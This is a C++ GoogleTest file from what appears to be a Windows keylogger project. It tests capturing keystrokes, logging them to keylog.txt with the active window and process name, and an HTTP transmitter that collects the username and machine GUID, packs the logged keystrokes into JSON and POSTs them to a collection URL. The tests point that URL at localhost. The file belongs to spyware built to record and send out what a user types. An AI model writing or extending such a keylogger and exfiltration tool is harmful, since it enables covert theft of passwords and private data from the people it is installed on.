#include "pch.h"
#include "keylogger.h"
#include "transmiter_http.h"

#include <string>
#include <fstream>

PROCESS_INFORMATION start_mock_server() {
	//in
	std::string app_args = "python -m http.server 80";
	DWORD cr_flags = CREATE_NO_WINDOW;
	//out
	STARTUPINFOA w_info = { 0 };
	w_info.cb = sizeof(w_info);
	PROCESS_INFORMATION p_info = { 0 };


	if (!CreateProcessA(
		NULL, app_args.data(),
		NULL, NULL, false,
		cr_flags, NULL, NULL,
		&w_info, &p_info))
	{
		throw std::runtime_error("Failed to create server proccess");
	}
	return p_info;
}
bool stop_mock_server(PROCESS_INFORMATION& p_i) {
	bool r = true;
	r &= TerminateProcess(p_i.hProcess, 0);
	r &= CloseHandle(p_i.hProcess);
	r &= CloseHandle(p_i.hThread);
	return r;
}


class SystemTests : public ::testing::Test {

};

TEST_F(SystemTests, LogingAndTransmiting) {
	Keylogger& keylogger = Keylogger::get_instance();
	keylogger.set_transmiter_conf("http://127.0.0.1:80/test/collect", 1, 5);

	//auto serv = start_mock_server();

	keylogger.start(true, true, false);
	std::this_thread::sleep_for(std::chrono::seconds(60));
	keylogger.stop();

	//stop_mock_server(serv);

	EXPECT_TRUE(true);
}


class KeyloggerTest : public ::testing::Test {
public:
	
	void call_log_key(Keylogger& logger, int vk_code, int wm_mode) {
		logger.log_key_(vk_code, WM_KEYDOWN);
	}
	std::string call_vk_to_string(Keylogger& logger, int vk_code) {
		return logger.vk_to_string_(vk_code);
	}
	std::string get_last_line(std::string filepath) {
		std::ifstream f(filepath, std::ios::in);

		std::string last_line = "";
		std::string line = "";
		while (std::getline(f, line)) last_line = line;

		f.close();
		return line;
	}
	LogNode get_log_with_info(Keylogger& logger) {
		WindowInfo window_inf = logger.get_active_window_info_();
		std::string time = logger.get_current_time_();
		return LogNode(window_inf, time);
	}

	LogNode get_back_of_buffer(Keylogger& logger) {
		return *logger.log_nodes_.back();
	}
	LogNode& get_active_node(Keylogger& logger) {
		return logger.active_log_node;
	}
};


//Keylogger tests
TEST_F(KeyloggerTest, LogToFile) {
	Keylogger& logger = Keylogger::get_instance();
	int vk = 75;
	std::string expected = "";
	std::string out = "";


	logger.start(false, true, true);

	call_log_key(logger, vk, WM_KEYDOWN);
	expected = call_vk_to_string(logger, vk);

	logger.stop();

	out = get_last_line("keylog.txt");

	

	EXPECT_EQ(expected, out);
	EXPECT_TRUE(true);
}

TEST_F(KeyloggerTest, BufferTest) {
	Keylogger& logger = Keylogger::get_instance();
	std::string ex_keystrokes = "";
	LogNode ex_log;
	LogNode active_node;
	LogNode back_node;
	int vk = 75;

	logger.start(false, true, false);
	call_log_key(logger, vk, WM_KEYDOWN);
	ex_keystrokes = call_vk_to_string(logger, vk);

	active_node = get_active_node(logger);
	back_node = get_back_of_buffer(logger);
	ex_log = get_log_with_info(logger);
	ex_log.keystrokes = ex_keystrokes;

	EXPECT_EQ(active_node, back_node);
	EXPECT_EQ(active_node, ex_log);
	EXPECT_EQ(ex_keystrokes, back_node.keystrokes);

	EXPECT_TRUE(true);
}

class TransmiterTests : public ::testing::Test {
protected:
	std::vector<std::unique_ptr<LogNode>> v;
	LogNode p;
	std::mutex m;
	void SetUp() override {
		v.push_back(std::make_unique<LogNode>(
			WindowInfo(R"(Placeholder-window-info" """ \n\r \\ {}1)", "someProcessName1", "some_window_class1"),
			"1765462200",
			"Placheholder-keystrokes \x1E "
		));
		v.push_back(std::make_unique<LogNode>(
			WindowInfo(R"(Placeholder-window-info" """ \n\r \\ {}1)", "someProcessName", "some_window_class"),
			"1765462260",
			"Placheholder-keystrokes 1"
		));
		p = *v[0];
	}
	void TearDown() override {

	}

public:

	std::string call_pack_data_to_json_(TransmiterHTTP& transmiter, std::vector<std::unique_ptr<LogNode>>& buff) {
		return transmiter.pack_data_to_json_(buff);
	}
	std::string call_save_username_(TransmiterHTTP& transmiter) {
		transmiter.save_username_();
		return transmiter.username_;
	}
	std::string call_save_machine_guid_(TransmiterHTTP& transmiter) {
		transmiter.save_machine_guid_();
		return transmiter.machine_guid_;
	}
	
	bool call_swap_buffers_(TransmiterHTTP& transmiter,
		std::vector<std::unique_ptr<LogNode>>& t_buf) {
		return transmiter.swap_buffers_(t_buf);
	}
};

//Transmiter tests

//test packing data into json and sending it via post to url ddd
//result can be checked by via wireshark or other network traffic analizer
	//tests saving username, saving machineGUID, packing data json, requesst, retries
	TEST_F(TransmiterTests, JustSendPost) {
		TransmiterHTTP transmiter(v, p, m);
		transmiter.set_conf("",1,1);

		std::cout << "Username: " << call_save_username_(transmiter) << std::endl;
		std::cout << "Machine GUID: " << call_save_machine_guid_(transmiter) << std::endl;
		std::string data = call_pack_data_to_json_(transmiter, v);

		//auto p_info = start_mock_server();
		transmiter.send_post_json(data, "http://127.0.0.1:80/test/collect");
		EXPECT_TRUE(true);
		//EXPECT_TRUE(stop_mock_server(p_info));

	}

//test buffer swaping, dangling pointer
TEST_F(TransmiterTests, BufferSwap) {
	TransmiterHTTP transmiter(v, p, m);
	std::vector<std::unique_ptr<LogNode>> t_buff;
	call_swap_buffers_(transmiter, t_buff);

	EXPECT_EQ(*v.back(), p);
	EXPECT_EQ(*t_buff[0], p);

	EXPECT_EQ(1, 1);
	EXPECT_TRUE(true);
}
